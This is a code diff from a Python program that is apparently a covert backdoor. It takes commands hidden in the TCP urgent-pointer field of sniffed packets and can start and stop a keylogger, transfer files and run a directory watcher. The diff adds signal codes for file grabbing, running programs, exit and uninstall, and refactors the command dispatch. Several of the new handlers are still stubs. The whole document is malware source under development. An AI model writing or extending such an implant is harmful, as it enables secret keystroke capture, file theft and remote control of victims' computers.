@@ -34,6 +34,10 @@ keylogger_stop_signal = 2
 file_transfer_signal = 3
 watcher_start_signal = 4
 watcher_stop_signal = 5
+file_grabber_signal = 6
+run_program_signal = 7
+exit_signal = 8
+uninstall_signal = 9
 current_signal = None
 signal_received = False
 keylogger_process = None
@@ -104,7 +108,7 @@ def signal_callback(packet):
 
         # Check for initial signal
         if current_signal is None or current_signal == 0:
-            if urgent_pointer_value in [keylogger_start_signal, keylogger_stop_signal, file_transfer_signal, watcher_start_signal, watcher_stop_signal]:
+            if urgent_pointer_value > 0 and urgent_pointer_value <= 9:
                 current_signal = urgent_pointer_value
                 received_chunks = 0
                 signal_received = True
@@ -162,16 +166,30 @@ def signal_callback(packet):
 def handle_initial_signal():
     """Handle the initial signal received."""
     global current_signal
-    if current_signal == keylogger_start_signal:
-        print("Start keylogger signal received.")
-        start_keylogger()
-    elif current_signal == keylogger_stop_signal:
-        print("Stop keylogger signal received.")
-        stop_keylogger()
-    elif current_signal == file_transfer_signal:
-        print("File transfer signal received.")
-    elif current_signal == watcher_stop_signal:
-        print("Stop watcher signal received.")
+    match current_signal:
+        case 1:
+            print("Keylogger start signal received.")
+            start_keylogger()
+        case 2:
+            print("Keylogger stop signal received.")
+            stop_keylogger()
+        case 3:
+            print("File transfer signal received.")
+        case 4:
+            print("Watcher start signal received.")
+        case 5:
+            print("Watcher stop signal received.")
+            stop_watcher()
+        case 6:
+            print("File grabber signal received.")
+        case 7:
+            print("Run program signal received.")
+        case 8:
+            print("Exit signal received.")
+            # reset, stop sniffer thread then start wait for pport knocking
+            
+        case 9:
+            print("Uninstall signal received.")
 
 def start_keylogger():
     """Start the keylogger process."""
@@ -213,15 +231,13 @@ def send_log_file():
 def handle_data(decoded_data):
     """Handle the received data based on the current signal."""
     global current_signal
-    if current_signal == file_transfer_signal:
-        save_file(decoded_data)
-    elif current_signal == watcher_start_signal:
-        decoded_data = decoded_data.decode('utf-8')
-        print(f"Watcher command received: {decoded_data}")
-        start_watcher(decoded_data)
-    elif current_signal == watcher_stop_signal:
-        print("Stop watcher command received.")
-        stop_watcher()
+    match current_signal:
+        case 3:
+            save_file(decoded_data)
+        case 4:
+            decoded_data = decoded_data.decode('utf-8')
+            print(f"Watcher command received: {decoded_data}")
+            start_watcher(decoded_data)
     reset_state()
 
 def save_file(decoded_data):
